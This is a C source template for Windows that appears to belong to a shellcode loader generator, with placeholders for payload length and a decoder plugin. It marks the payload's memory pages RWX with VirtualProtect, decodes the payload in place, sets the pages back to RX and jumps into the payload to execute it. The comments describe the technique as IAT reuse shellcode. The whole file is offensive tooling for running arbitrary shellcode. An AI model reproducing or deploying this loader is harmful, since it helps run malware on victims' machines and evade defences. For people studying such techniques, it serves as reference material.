#include <Windows.h>

#include <time.h>

char *supermega_payload;

#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40

/* iat_reuse_rwx_rx

   IAT reuse shellcode
   * reuse payload location (both in .rdata and .text)
   * does (rw/rx) -> rwx -> rx
*/

int main()
{
    DWORD result;
    char *dest = supermega_payload;

    // Note: RWX if carrier and payload are on the same page (or we cant exec copy..)
    //       can do only RW otherwise?
    for(int n=0; n<({{PAYLOAD_LEN}}/4096)+1; n++) {
        if (VirtualProtect(dest + (n * 4096), 16, p_RWX, &result) == 0) {
            return 16;
        }
    }

{{ plugin_decoder }}

    for(int n=0; n<{{PAYLOAD_LEN}}/4096; n++) {
        if (VirtualProtect(dest + (n * 4096), 16, p_RX, &result) == 0) {
            return 16;
        }
    }

    // Execute *dest
    (*(void(*)())(dest))();

	return 0;
}
